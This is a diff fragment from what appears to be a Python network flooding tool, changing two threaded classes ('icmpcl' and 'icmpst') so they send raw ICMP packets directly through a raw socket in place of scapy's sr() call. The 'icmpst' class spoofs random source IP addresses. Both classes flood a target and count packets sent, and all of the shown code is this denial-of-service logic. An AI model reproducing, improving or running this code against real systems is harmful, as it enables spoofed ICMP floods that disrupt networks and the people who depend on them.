@@ -2771,11 +2771,10 @@ class icmpcl(threading.Thread):
     data=data[0:1400]
    try:
     packet=IP(ttl=random.randint(self.minttl,self.maxttl),dst=self.target)/ICMP()/data
-    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    """packet=bytes(packet)
-    s.sendto(packet,(self.target,self.port))"""
-    sr(packet,verbose=0,inter=0.1,retry=0,timeout=1)
+    packet=bytes(packet)
+    s.sendto(packet,(self.target,self.port))
     icmp_counter+=1
     if prints==True:
      print("[!]Packets sent: {} | Bytes: {}".format(icmp_counter,len(data)))
@@ -2851,11 +2850,10 @@ class icmpst(threading.Thread):
     else:
      sip=self.ip_seg.format(random.randint(0,255),random.randint(0,255),random.randint(0,255),random.randint(0,255))
     packet=IP(ttl=random.randint(self.minttl,self.maxttl),src=sip,dst=self.target)/ICMP()/data
-    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+    s= socket.socket(socket.AF_INET, socket.SOCK_RAW, 1)
     s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-    """packet=bytes(packet)
-    s.sendto(packet,(self.target,self.port))"""
-    sr(packet,verbose=0,retry=0,timeout=1)
+    packet=bytes(packet)
+    s.sendto(packet,(self.target,self.port))
     icmpstorm_counter+=1
     if prints==True:
      print("[!]Packets sent: {} | IP: {} | Bytes: {}".format(icmpstorm_counter,sip,len(data)))
